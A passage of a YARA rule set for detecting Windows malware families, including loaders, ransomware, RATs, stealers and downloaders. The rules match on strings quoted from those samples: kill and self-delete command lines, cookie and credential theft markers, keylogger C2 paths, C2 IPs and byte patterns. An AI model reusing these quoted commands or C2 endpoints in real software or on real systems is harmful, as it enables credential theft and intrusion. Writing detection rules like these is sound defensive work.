uint16(0) == 0x5a4d and (3 of ($s*) or all of ($c*) or (4 of ($c*) and 2 of ($s*)))
}
rule SSC_Win_BazarLoader {
meta:
author = "ditekSHen"
description = "Detects BazarLoader variants"
strings:
$s1 = "Startdelay for %d ms to avoid some dynamic AV detects!" ascii
$s2 = "Use Debug for moving faster!" ascii
$s3 = "Logging Mutex %s to %s" ascii
$s4 = "FIRST AND ONLY COPY RUNNING! Mutex %s" ascii
$s5 = "the most secret 3d GetWinApiPointers line in the world!" ascii
$s6 = "[+] makeMD5hash. " ascii
condition:
uint16(0) == 0x5a4d and 3 of ($s*)
}
rule SSC_Win_CoinMiner01 {
meta:
author = "ditekSHen"
description = "Detects coinmining malware"
strings:
$s1 = "-o pool." ascii wide
$s2 = "--cpu-max-threads-hint" ascii wide
$s3 = "-P stratum" ascii wide
$s4 = "--farm-retries" ascii wide
$dl = "github.com/ethereum-mining/ethminer/releases/download" ascii wide
condition:
uint16(0) == 0x5a4d and (3 of ($s*) or ($dl))
}
rule SSC_Win_Hello {
meta:
author = "ditekSHen"
description = "Hunt for Hello / WickrMe ransomware"
strings:
$s1 = "DeleteBackupFiles" ascii wide
$s2 = "GetEncryptFiles" ascii wide
$s3 = "DeleteVirtualDisks" ascii wide
$s4 = "DismountVirtualDisks" ascii wide
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_Win_ButeRAT {
meta:
author = "ditekSHen"
description = "Detects ButeRAT"
strings:
$x1 = "TVqQAAMAA" ascii
$s1 = "ipinfo.io/geo" wide
$s2 = "/index.php" wide
$s3 = "Copy-Item -Path" wide
$s4 = ";Start-Process" wide
$s5 = "Microsoft\\Windows\\Start Menu\\Programs\\Startup" wide
$s6 = "LOCALAPPDATA" fullword wide
$s7 = "passwords.json" wide
$s8 = "Scripting.FileSystemObject" fullword wide
$z1 = /(edge|chrome|opera|exodus|jaxx|atomic|coinomi)\.zip/ ascii wide nocase
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) or 1 of ($z*)) and (4 of ($s*)) or (6 of ($s*)) or (#z1 > 4 and 2 of them))
}
rule SSC_Win_CookieStealer {
meta:
author = "ditekSHen"
description = "Detects generic cookie stealer"
strings:
$s1 = "([\\S]+?)=([^;|^\\r|^\\n]+)" fullword ascii
$s2 = "(.+?): ([^;|^\\r|^\\n]+)" fullword ascii
$s3 = "Set-Cookie: ([^\\r|^\\n]+)" fullword ascii
$s4 = "cmd.exe /c taskkill /f /im chrome.exe" fullword ascii
$s5 = "FIREFOX.EXE|Google Chrome|IEXPLORE.EXE" ascii
$pdb1 = "F:\\facebook_svn\\trunk\\database\\Release\\DiskScan.pdb" fullword ascii
$pdb2 = "D:\\Projects\\crxinstall\\trunk\\Release\\spoofpref.pdb" fullword ascii
$ua1 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36" fullword ascii
$ua2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" fullword ascii
condition:
uint16(0) == 0x5a4d and ((all of ($s*) and 1 of ($pdb*) and 1 of ($ua*)) or (all of ($ua*) and 1 of ($pdb*) and 2 of ($s*)))
}
rule SSC_Win_BitCoinGrabber {
meta:
author = "ditekSHen"
description = "Detects generic bitcoin stealer"
strings:
$s1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
$s2 = "Bitcoin-Grabber" ascii
$s3 = "Bitcoin_Grabber" ascii
$s4 = "encrypt resources [compress]T" fullword ascii
$s5 = "code control flow obfuscationT" fullword ascii
$s6 = "\\Users\\lakol\\Desktop\\a\\Crypto Currency Wallet Changer\\" ascii
$pat1 = "\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\\b" fullword wide
$pat2 = "\\b0x[a-fA-F0-9]{40}\\b" fullword wide
$pat3 = "\\b4([0-9]|[A-B])(.){93}\\b" fullword wide
condition:
uint16(0) == 0x5a4d and 4 of ($s*) or (all of ($pat*) and 2 of ($s*))
}
rule SSC_Win_BrowserGrabber {
meta:
author = "ditekSHen"
description = "Hunt for FOXGRABBER-like samples but for various browsers"
strings:
$s1 = "start grabbing" wide
$s2 = "end grabbing in" wide
$s3 = "error of copying files from comp:" wide
$s4 = /(Chrome|Edge)/ wide
$ff = "\\Firefox\\" wide nocase
$pdb1 = "\\obj\\Debug\\grab" ascii
$pdb2 = "\\obj\\Release\\grab" ascii
condition:
uint16(0) == 0x5a4d and not ($ff) and (all of ($s*) or (1 of ($pdb*) and 1 of ($s*)))
}
rule SSC_Win_DeathRansom {
meta:
author = "ditekSHen"
description = "Detects known DeathRansom ransomware"
strings:
$s1 = "%s %f %c" fullword ascii
$pdb1 = ":\\wud.pdb" ascii
$spdb2 = "\\crypt_server\\runtime\\crypt" ascii
$spdb3 = "\\bin\\nuvin.pdb" ascii
$h1 = "#Dunubeyokunov" wide
$h2 = "^Neyot dehipijakeyelih" wide
$h3 = "talin%Sanovurenofibiw" wide
$h4 = "WriteFile" fullword ascii
$h5 = "ClearEventLogA" fullword ascii
$h6 = "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" ascii wide
condition:
uint16(0) == 0x5a4d and (all of ($pdb*) or (all of ($s*) and 1 of ($pdb*)) or 5 of ($h*))
}
rule SSC_Win_UnlockYourFiles {
meta:
author = "ditekSHen"
description = "Detects UnlockYourFiles ransomware"
strings:
$s1 = "filesx0" wide
$s2 = "_auto_file" wide
$s3 = "<EncyptedKey>" fullword wide
$s4 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\" wide
$s5 = "DecryptAllFile" fullword ascii
$s6 = "AES_Only_Decrypt_File" fullword ascii
$m1 = "Free files decrypted" wide
$m2 = "Restore my files" wide
$m3 = "Type tour password..." wide
$m4 = "files encrypted by strong password" ascii
$m5 = "buy bitcoin" ascii
$m6 = "Unlock File" fullword wide
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or 5 of ($m*) or (2 of ($s*) and 2 of ($m*)))
}
rule SSC_Win_DecryptMyFiles {
meta:
author = "ditekSHen"
description = "Detects DecryptMyFiles ransomware"
strings:
$s1 = "FILES ENCRYPTED" wide
$s2 = "pexplorer.exe" fullword wide
$s3 = "uniquesession" fullword ascii
$s4 = ".[decryptmyfiles.top]." fullword ascii
$s5 = "decrypt 1 file" ascii
$s6 = "(databases,backups, large excel" ascii
$c1 = "api/connect.php" ascii
$c2 = "decryptmyfiles.top" ascii
$c3 = "/contact/" ascii
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or all of ($c*) or (2 of ($c*) and 2 of ($s*)))
}
rule SSC_Win_Motocos {
meta:
author = "ditekSHen"
description = "Detects Motocos ransomware"
strings:
$s1 = "Block Investigation Tools" wide
$s2 = "powershell.exe,taskmgr.exe,procexp.exe,procmon.exe" wide
$s3 = "google.com,youtube.com,baidu.com,facebook.com,amazon.com,360.cn,yahoo.com,wikipedia.org,zoom.us,live.com,reddit.com,netflix.com,microsoft.com,instagram.com,vk.com," wide
$s4 = "START ----" wide
$s5 = "TEngine.Clear_EventLog_Result" wide
$s6 = "TEngine.EncryptLockFiles" wide
$s7 = "TEngine.CleanShadowFiles" wide
$s8 = "TDNSUtils.SendCommand" wide
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_DLAgent12 {
meta:
author = "ditekSHen"
description = "Detects downloader agent"
strings:
$s1 = "WebClient" fullword ascii
$s2 = "DownloadData" fullword ascii
$s3 = "packet_server" fullword wide
condition:
uint16(0) == 0x5a4d and all of them and filesize < 50KB
}
rule SSC_Win_DLInjector01 {
meta:
author = "ditekSHen"
description = "Detects specific downloader injector shellcode"
strings:
$s1 = "process call create \"%s\"" ascii wide
$s2 = "\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Enum\\" ascii wide
$s3 = "%systemroot%\\system32\\ntdll.dll" ascii wide
$s4 = "qemu-ga.exe" ascii wide
$s5 = "prl_tools.exe" ascii wide
$s6 = "vboxservice.exe" ascii wide
$o1 = { 75 04 74 02 38 6e 8b 34 24 83 c4 04 eb 0a 08 81 }
$o2 = { 16 f8 f7 ba f0 3d 87 c7 95 13 b7 64 22 be e1 59 }
$o3 = { 8b 0c 24 83 c4 04 eb 05 ea f2 eb ef 05 e8 ad fe }
$o4 = { eb 05 1d 51 eb f5 ce e8 80 fd ff ff 77 a1 f4 cd }
$o5 = { eb 05 6e 33 eb f5 73 e8 64 f6 ff ff 77 a1 f4 77 }
$o6 = { 59 eb 05 fd 98 eb f4 50 e8 d5 f5 ff ff 3b b9 00 }
$o7 = "bYkoDA7G" fullword ascii
condition:
(uint16(0) == 0x5a4d and all of ($o*)) or (all of ($s*))
}
rule SSC_Win_DLInjector02 {
meta:
author = "ditekSHen"
description = "Detects downloader injector"
strings:
$x1 = "In$J$ct0r" fullword wide
$x2 = "%InJ%ector%" fullword wide
$a1 = "WriteProcessMemory" fullword wide
$a2 = "URLDownloadToFileA" fullword ascii
$a3 = "Wow64SetThreadContext" fullword wide
$a4 = "VirtualAllocEx" fullword wide
$s1 = "RunPE" fullword wide
$s2 = "SETTINGS" fullword wide
$s3 = "net.pipe" fullword wide
$s4 = "vsmacros" fullword wide
condition:
uint16(0) == 0x5a4d and (1 of ($x*) or (all of ($a*) and 3 of ($s*)))
}
rule SSC_Win_Nermer {
meta:
author = "ditekSHen"
description = "Detects Nermer ransomware"
strings:
$x1 = "gPROTECT_INFO.TXT" fullword wide
$x2 = ".nermer" fullword wide
$s1 = "db_journal" fullword wide
$s2 = "quicken2015backup" fullword wide
$s3 = "mysql" fullword wide
$s4 = "sas7bdat" fullword wide
$s5 = "httpd.exe" fullword wide
$s6 = "Intuit.QuickBooks.FCS" fullword wide
$s7 = "convimage" fullword wide
$s8 = ".?AV?$_Binder@U_Unforced@std@@P8shares_t@" ascii
$s9 = "BgIAAACkAABSU0ExAAgAAAEAAQCt" ascii
$m1 = "YOUR FILES WERE ENCRYPTED" ascii
$m2 = "MARKED BY EXTENSION .nermer" ascii
$m3 = "send us your id: >> {id} <<" ascii
$m4 = "email us: >> {email} <<" ascii
$c1 = "/repeater.php" ascii
$c2 = "HTTPClient/0.1" fullword ascii
$c3 = "94.156.35.227" ascii
$c4 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($m*) or all of ($c*) or all of ($s*)  or (4 of ($s*) and (1 of ($x*) or 1 of ($m*) or 2 of ($c*))) or 14 of them)
}
rule SSC_Win_Beastdoor {
meta:
author = "ditekSHen"
description = "Detects Beastdoor backdoor"
strings:
$s1 = "shellx.pif" fullword ascii nocase
$s2 = "Beasty" fullword ascii
$s3 = "* Boot:[" ascii
$s4 = "^ Shut Down:[" ascii
$s5 = "set cdaudio door" ascii
$s6 = "This \"Portable Network Graphics\" image is not valid" wide
$n1 = ".aol.com" ascii
$n2 = "web.icq.com" ascii
$n3 = "&fromemail=" fullword ascii
$n4 = "&subject=" fullword ascii
$n5 = "&Send=" fullword ascii
$n6 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword ascii
$n7 = "mirabilis.com" ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or 5 of ($n*) or (3 of ($s*) and 3 of ($n*)))
}
rule SSC_Win_GravityRAT {
meta:
author = "ditekSHen"
description = "Detects GravityRAT"
strings:
$s1 = "/GX/GX-Server.php?VALUE=2&Type=" wide
$s2 = "&SIGNATUREHASH=" wide
$s3 = "Error => CommonFunctionClass => Upload()" wide
$s4 = "/GetActiveDomains.php" wide
$s5 = "DetectVM" ascii wide
$s6 = "/c {0} > {1}" wide
$s7 = "DRIVEUPLOADCOMPLETED => TOTALFILES={0}, FILESUPLOADED={1}" wide
$s8 = "Program => RunAFile()" wide
$s9 = "DoViaCmd" ascii
$s10 = ".msoftupdates.com:" wide
$f1 = "<RootJob>b__" ascii
$f2 = "<GetFiles>b__" ascii
$f3 = "<UpdateServer>b__" ascii
$f4 = "<EthernetId>b__" ascii
$f5 = "<MatchMacAdd>b__" ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or (all of ($f*) and 1 of ($s*)))
}
rule SSC_Win_FatalRAT {
meta:
author = "ditekSHen"
description = "Detects FatalRAT"
strings:
$x1 = "XXAcQbcXXfRSScR" fullword ascii
$s1 = "CHROME_NO_DATA" fullword ascii
$s2 = "CHROME_UNKNOW" fullword ascii
$s3 = "-Thread running..." ascii
$s4 = "InetCpl.cpl,ClearMyTracksByProcess" ascii nocase
$s5 = "MSAcpi_ThermalZoneTemperature" ascii nocase
$s6 = "taskkill /f /im rundll32.exe" fullword ascii nocase
$s7 = "del /s /f %appdata%\\Mozilla\\Firefox" ascii nocase
$s8 = "\\\\%s\\C$\\" ascii
$s9 = "fnGetChromeUserInfo" fullword ascii
$s10 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" fullword ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 3 of ($s*)) or 5 of ($s*))
}
rule SSC_Win_WinGo {
meta:
author = "ditekSHen"
description = "Detects malicious Golang executables"
strings:
$s1 = "Go build ID:" ascii
$s2 = /main\.[a-z]{9}Delete/ fullword ascii
$s3 = /main\.[a-z]{9}Update/ fullword ascii
$s4 = /main\.[a-z]{9}rundll/ fullword ascii
condition:
uint16(0) == 0x5a4d and (all of them and #s2 > 2 and #s3 > 2 and #s4 > 2)
}
rule SSC_Win_GENERIC03 {
meta:
author = "ditekSHen"
description = "Detects unknown malicious executables"
strings:
$s1 = "lbroscfg.dll" wide
$s2 = "cmd /c ping 127.0.0.1 & del /f /q \"" fullword wide
$s3 = "E:\\Data\\Sysceo\\AD\\" fullword ascii
$s4 = "C++\\Browser_noime\\" ascii
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_Win_PandaStealer {
meta:
author = "ditekSHen"
description = "Detects Panda Stealer"
strings:
$s1 = "\\tokens.txt" fullword ascii
$s2 = "user.config" fullword ascii
$s3 = "Discord\\" ascii
$s4 = "%s\\etilqs_" fullword ascii
$s5 = "buildSettingGrabber" ascii
$s6 = "buildSettingSteam" ascii
$s7 = ".?AV?$_Ref_count_obj2@U_Recursive_dir_enum_impl@filesystem@std@@@" ascii
$s8 = "UPDATE %Q.%s SET sql = substr(sql,1,%d) || ', ' || %Q || substr" ascii
$s9 = "|| substr(name,%d+18) ELSE name END WHERE tbl_name=%Q AND (" ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_Gelsemine {
meta:
author = "ditekSHen"
description = "Detects Gelsemine"
strings:
$s1 = "If any of these steps fails.only pick one of the targets for configuration\"If you want to just get on with it*which also use [ " wide
$s2 = "A make implementation+with core modules (please read NOTES.PER_L)2The per_l Text::Template (please read NOTES.PER_L)" wide
$s3 = "NOTES.VMS (OpenVMS)!NOTES.WIN (any supported Windows)%NOTES.DJGPP (DOS platform with DJGPP)'NOTES.ANDROID (obviously Android [ND" wide
$s4 = "A simple example would be this)which is to be understood as one of these" fullword wide
$s5 = "bala bala bala" fullword wide
$s6 = "echo FOO" fullword wide
$s7 = "?_Tidy@?$basic_string@DU?$char_traits@D@std@@V" ascii
$o1 = { eb 08 c7 44 24 34 fd ff ff ff 8b 44 24 54 8b 4c }
$o2 = { eb 08 c7 44 24 34 fd ff ff ff 8b 44 24 54 8b 4c }
$o3 = { 8b 76 08 2b f0 a1 34 ff 40 00 03 f0 89 35 38 ff }
$o4 = { 83 c4 34 c3 8b 4e 20 6a 05 e8 73 10 00 00 8b 76 }
$o5 = { 8b 44 24 44 2b d1 03 d0 8b f2 e9 14 ff ff ff 8d }
$o6 = { 68 00 06 00 00 6a 00 e8 d3 ff ff ff a2 48 00 41 }
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or (all of ($o*) and 2 of ($s*)))
}
rule SSC_Win_Gelsenicine {
meta:
author = "ditekSHen"
description = "Detects Gelsenicine"
strings:
$s1 = "System/" fullword wide
$s2 = "Windows/" fullword wide
$s3 = "CommonAppData/" fullword wide
$s5 = ".?AUEmbeddedResource@@" fullword ascii
$ms1 = "pulse" fullword wide
$ms2 = "mainpath" fullword wide
$ms3 = "mainpath64" fullword wide
$ms4 = "pluginkey" fullword wide
$o1 = { 48 8d 54 24 68 48 8b 4c 39 10 e8 4d ff ff ff 44 }
$o2 = { 48 8d 54 24 30 48 8b cb e8 34 f2 ff ff 84 c0 74 }
$o3 = { 48 c7 44 24 ?? fe ff ff ff 49 8b f0 48 8b d9 ?? }
$o4 = { 89 44 24 30 89 44 24 34 48 8b 53 08 48 85 d2 48 }
$o5 = { ff ff ff ff 49 f7 d1 4c 23 f8 8b 43 10 48 8b e9 }
$o6 = { 83 c4 24 85 c0 74 3c 8b 0b 8b 41 34 8b 4d 34 2b }
$o7 = { 8b 45 34 8b 53 fc 50 8b cf 6a 04 68 00 10 00 00 }
$o8 = { 80 74 1f 8b 4e 34 8b 54 24 18 25 ff ff 00 00 51 }
$o9 = { eb 47 8b 4c 24 14 8b 56 34 52 8d 3c 08 8b 44 24 }
$o10 = { 8b 44 24 0c 5d 5e 5b 83 c4 10 c3 8b 4e 34 51 57 }
$o11 = { 6a 03 53 53 56 68 34 00 e4 74 ff 15 80 d0 e3 74 }
condition:
uint16(0) == 0x5a4d and ((all of ($s*) and (3 of ($ms*) or 4 of ($o*))) or (all of ($ms*) and 2 of ($s*) and 3 of ($o*)))
}
rule SSC_Win_Gelsevirine {
meta:
author = "ditekSHen"
description = "Detects Gelsevirine"
strings:
$s1 = /64loadpath(xp|sv|7)/ fullword wide
$s2 = "{\"Actions\":[]}" fullword wide
$s3 = "PlatformsChunk" fullword wide
$s4 = "CurrentPluginCategory" fullword wide
$s5 = "CurrentOperationPlatform" fullword wide
$s6 = "PersistencePlugins" fullword wide
$s7 = "memory_library_file" fullword wide
$s8 = "LoadPluginBP" fullword ascii
$s9 = "GetOperationBasicInformation" fullword ascii
$s10 = "commonappdata/Intel/Runtime" wide
$s11 = "cfsst x64" fullword wide
$s12 = "ForkOperation" fullword ascii
$c1 = "domain.dns04.com:8080;domain.dns04.com:443;acro.ns1.name:80;acro.ns1.name:1863;" wide
$c2 = "<base64 content=\"" fullword ascii
$c3 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
$m1 = "6BDA7FEF-232F-4EA6-8FC8-24F58CD7B366" ascii wide
$m2 = "46EBBDC3-EEDC-42D4-BA1D-D454DFCE8E42" ascii wide
$m3 = "135054C6-8036-42C7-A97C-31F37D7728BD" ascii wide
$m4 = "DC7FDDF7-B2F1-4B99-BE6A-AA683FF11CE6" ascii wide
$m5 = "131C8113-E083-4C7F-BEAF-82D73B01F2C5" ascii wide
$m6 = "4CCF506D-2F61-4C3A-B9C6-9FA47D43A3FC" ascii wide
$m7 = "B2DC745A-66AE-4A19-B11C-AD74D46B7EE0" ascii wide
$m8 = "6BDA7FEF-232F-4EA6-8FC8-24F58CD7B366" ascii wide
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or (2 of ($c*) and 4 of ($s*)) or (5 of ($m*) and (1 of ($c*) or 3 of ($s*))))
}
rule SSC_Win_IPsecHelper {
meta:
author = "ditekSHen"
description = "Detects IPsecHelper backdoor"
strings:
$s1 = "rundll32.exe advapi32.dll,ProcessIdleTasks" wide
$s2 = "CommandExecute" fullword ascii
$s3 = "DownloadExecuteUrl" fullword ascii
$s4 = "DownloadExecuteFile" fullword ascii
$s5 = "CmdExecute" fullword ascii
$s6 = "ExecuteProcessWithResult" fullword ascii
$s7 = "IsFirstInstance ==> checked" fullword wide
$s8 = "del \"%PROG%%SERVICENAME%\".*" fullword wide
$s9 = ".CreateConfig" wide
$s10 = ".SelfDelete" wide
$c1 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; EmbeddedWB 14.52 from: http://www.google.com/ EmbeddedWB 14.52;" wide
$c2 = "boot.php" wide
$c3 = "lastupdate.php" wide
$c4 = "main.php" wide
$c5 = "InternetNeeded" wide
$c6 = "DeviceIdSalt" wide
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or 4 of ($c*) or 8 of them)
}
rule SSC_Win_Apostle {
meta:
author = "ditekSHen"
description = "Detects Apsotle"
strings:
$s1 = "bytesToBeEncrypted" fullword ascii
$s2 = "SelfDelete" fullword ascii
$s3 = "ReadMeFileName" ascii
$s4 = "DesktopFileName" ascii
$s5 = "SetWallpaper" fullword ascii
$s6 = "get_EncryptionKey" fullword ascii
$s7 = "disall" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_DEADWOOD {
meta:
author = "ditekSHen"
description = "Detects DEADWOOD"
strings:
$s1 = "Service Start Work !!!!" fullword ascii
$s2 = "Error GetTokenInformation : " fullword ascii
$s3 = "\\Windows\\System32\\net.exe" fullword wide
$s4 = "App Start Work !!!!" fullword ascii
$s5 = "vmmouse" fullword wide
$s6 = "CDPUserSvc_" wide
$s7 = "WpnUserService_" wide
$s8 = "User is :" wide
$s9 = "\\params" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_Turian {
meta:
author = "ditekSHen"
description = "Hunt for Turian / Qurian"
hash1 = "d1218ab9d608ee0212e880204e4d7d75f29f03b77248bca7648d111d67405759"
cnc_domain = "windowsupdate[.]dyndns[.]info"
cnc_ip = "58[.]158[.]177[.]102"
strings:
$s1 = "%s a -m5 -hp1qaz@WSX3edc -r %s %s\\*.*" ascii wide
$s2 = "%s a -m5 -hpMyHost-1 -r %s %s\\*.*" ascii wide
$s3 = "%s a -m5 -hp1qaz@WSX3edc -ta%04d%02d%02d000000 -r %s c:" ascii wide
$s4 = "%s a -m5 -hpMyHost-1 -ta%04d%02d%02d000000 -r %s c:"
$s5 = "cmd /c dir /s /O:D %s>>\"%s\"" ascii wide
$s6 = "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v %s /t REG_SZ /d \"%s\" /f" fullword ascii
$s7 = "Not Connect!" fullword ascii
$p1 = "RECYCLER\\S-1-3-33-854245398-2067806209-0000980848-2003\\" ascii wide
$p2 = "%sRECYCLER.{S-1-3-33-854245398-2067806209-0000980848-2003}\\" ascii wide
$p3 = "\\RECYCLER.{S-1-3-33-854245398-2067806209-0000980848-2003}\\" ascii wide
$p4 = "\\RECYCLER.{645ff040-5081-101b-9f08-00aa002f954e}\\" ascii wide
$p5 = "%sRECYCLER.{645ff040-5081-101b-9f08-00aa002f954e}\\" ascii wide
$c1 = "CONNECT %s:%u HTTP/1." ascii wide
$c2 = "User-Agent: Mozilla/4.0" ascii wide
$m1 = "winsupdatetw" fullword ascii wide
$m2 = "clientsix" fullword ascii wide
$m3 = "updatethres" fullword ascii wide
$m4 = "uwatchdaemon" fullword ascii wide
condition:
uint16(0) == 0x5a4d and (3 of ($s*) or (all of ($c*) and (2 of ($s*) or 1 of ($m*) or 1 of ($p*))) or (1 of ($m*) and 1 of ($s*) and (1 of ($c*) or 1 of ($p*))))
}
rule SSC_Win_DLAgent14 {
meta:
author = "ditekSHen"
description = "Detects downloader injector"
strings:
$s1 = "%ProgramData%\\AVG" fullword wide
$s2 = "%ProgramData%\\AVAST Software" fullword wide
$s3 = "%wS\\%wS.vbs" fullword wide
$s4 = "%wS\\%wS.exe" fullword wide
$s5 = "CL,FR,US,CY,FI,HR,HU,RO,PL,IT,PT,ES,CA,DK,AT,NL,AU,AR,NP,SE,BE,NZ,SK,GR,BG,NO,GE" ascii
$s6 = "= CreateObject(\"Microsoft.XMLHTTP\")" ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_MarkiRAT {
meta:
author = "ditekSHen"
description = "Detects MarkiRAT"
strings:
$pdb = "\\mfcmklg.pdb" ascii
$s1 = "runinhome Completed" wide
$s2 = "ERROR find next file<br>" wide
$s3 = "<br><mark>Hello: %s</mark>" wide
$s4 = "<br><mark>CLIPBOARD[" wide
$s5 = "@userhome@" wide
$s6 = "Global\\{2194ABA1-BFFA-4e6b-8C26-D1BB20190312}" wide
$s7 = "taskkill /im svehost.exe /t /f" fullword ascii
$s8 = "taskkill /im keepass.exe /t /f" fullword ascii
$ba = /bitsadmin \/(addfile|cancel|SetPriority|resume)/ ascii wide
$c1 = "/ech/client.php?u=" wide
$c2 = "/up/uploadx.php?u=" wide
$c3 = "/ech/echo.php?req=rr&u=" wide
$c4 = "/ech/rite.php" wide
$c5 = "http://microsoft.com-view.space/i.php?u=" wide
$c6 = "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"" ascii
condition:
uint16(0) == 0x5a4d and (($pdb and any of them) or (5 of ($s*)) or (3 of ($c*)) or ((#ba > 3 and 4 of them)))
}
rule SSC_Win_KlingonRAT {
meta:
author = "ditekSHen"
description = "Detects KlingonRAT"
strings:
$go = "Go build ID:" ascii
$s1 = "/UCRelease/src/client/uac/once/"
$s2 = "%T\\AppData\\Local\\Windows Update\\"
$s3 = "%TSoftware\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
$s4 = "wmic /namespace:'\\\\root\\subscription' PATH"
$s5 = "C:\\Windows\\System32\\fodhelper.exeCaption,ParentProcessId,ProcessId"
$s6 = "ldpro.exelsass.exeluall.exeluspt.exe"
$s7 = "scangui.exedeps/lsass.exeetrustcipe.exefile"
$s8 = "alogserv.exeaplica32.exeapvxdwin.exeatro55en.exeautodown.exeavconsol.exeavgserv9.exeavkwctl9.exeavltmain.exeavpdos32.exeavsynmgr.exeavwupd32.exeavwupsrv.exe"
$c1 = "%s/keyLogger?machineId=%s" ascii
$c2 = "%s/stealer?machineId=%s" ascii
$c3 = "%s/lsass?machineId=%s" ascii
$c4 = "%s/logger?machineId=%s" ascii
$c5 = "%s/machineInfo?machineId=%s" ascii
$c6 = "failurehttps://%s:%d/botif-modified-sinceillegal" ascii
condition:
uint16(0) == 0x5a4d and ($go) and (3 of ($c*) or 5 of ($s*) or (3 of ($s*) and 1 of ($c*)))
}
rule SSC_Win_XFiles {
meta:
author = "ditekSHen"
description = "Detects X-Files infostealer (formerly BotSh1zoid)"
strings:
$x1 = "\\BotSh1zoid\\" ascii
$x2 = "\\BuildPacker.pdb" ascii
$x3 = "\\Svc_host.pdb" ascii nocase
$s1 = "WDefender" fullword ascii
$s2 = "CheckDefender" fullword ascii
$s3 = "RunPS" fullword ascii
$s4 = "DownloadFile" fullword ascii
$v1_1 = "<Pass encoding=\"base64\">(.*)</Pass>" wide
$v1_2 = "Grabber\\" wide
$v1_3 = "/log.php" wide
$v1_4 = /Browsers\\(Logins|Cards|Cookies)/ wide
$v1_5 = "<StealSteam>b__" ascii
$v1_6 = "record_header_field" fullword ascii
$v1_7 = "JavaScreenshotiptReader" fullword ascii
$v1_8 = "HTTPDebuggerPro" wide
$v1_9 = "IEInspector" wide
$v1_10 = "Fiddler" wide
$v2_1 = /get_(Cookie|Logins|Cards)Path/ fullword ascii
$v2_2 = "get_AllScreens" fullword ascii
$v2_3 = "{0}_{1}_{2}.zip" fullword wide
$v2_4 = "\\Stealer" fullword wide
$g1 = "$983a3552-4ec3-4936-bd4a-8e6fd67b4c67" fullword ascii
$g2 = "$a5d9ca4d-400f-4e07-8c09-a916b548f2e3" fullword ascii
$g3 = "$ebc25cf6-9120-4283-b972-0e5520d0000C" fullword ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and (3 of ($s*) or 3 of ($v1*) or 3 of ($v2*))) or 7 of ($v1*) or 3 of ($v2*) or (2 of ($g*) and 3 of them))
}
rule SSC_Win_AllaKore {
meta:
author = "ditekSHen"
description = "Detects AllaKore"
strings:
$x1 = "AllaKore Remote - Chat" fullword wide
$x2 = "AllaKore Remote - Share Files" fullword wide
$x3 = "CYRUS - Chat" fullword wide
$x4 = "CYRUS - Share Files" fullword wide
$x5 = "<|REDIRECT|><|GETFOLDERS|>" fullword wide
$x6 = "<|REDIRECT|><|DOWNLOADFILE|>" fullword wide
$x7 = "<|REDIRECT|><|WHEELMOUSE|>" fullword wide
$x8 = "<|REDIRECT|><|SETMOUSE" wide
$x9 = "<|CHECKIDPASSWORD|>" fullword wide
$x10 = "<|KEYBOARDSOCKET|>" fullword wide
$x11 = "<|REDIRECT|><|CLIPBOARD|>" fullword wide
$x12 = "<|IDEXISTS!REQUESTPASSWORD|>" fullword wide
$x13 = "<|GETFULLSCREENSHOT|>" fullword wide
$x14 = "<|MAINSOCKET|>" fullword ascii
$s1 = "You can not connect with yourself!" wide
$s2 = "Waiting for authentication..." wide
$s3 = "Connected support!" wide
$s4 = "ID does nor exists." wide
$s5 = "Finding the ID..." wide
$s6 = "PC is Busy!" wide
$s7 = "Upload &  Execute" fullword ascii
$s8 = "Download file selected" fullword ascii
$s9 = "CaptureKeys_TimerTimer" fullword ascii
$s10 = "Remote File Manager" fullword ascii
condition:
uint16(0) == 0x5a4d and (4 of ($x*) or 4 of ($s*) or (3 of ($s*) and 2 of ($x*)))
}
rule SSC_Win_ReverseRAT {
meta:
author = "ditekSHen"
description = "Detects ReverseRAT"
strings:
$pdb1 = "\\ReverseRat.pdb" ascii nocase
$pdb2 = "\\ReverseRat\\obj\\" ascii nocase
$s1 = "processCmd" fullword ascii
$s2 = "CmdOutputDataHandler" fullword ascii
$s3 = "sendingProcess" fullword ascii
$s4 = "SetStartup" fullword ascii
$s5 = "RunServer" fullword ascii
$s6 = "_OutputDataReceived" ascii
$s7 = { 63 00 6d 00 64 00 2e 00 65 00 78 00 65 00
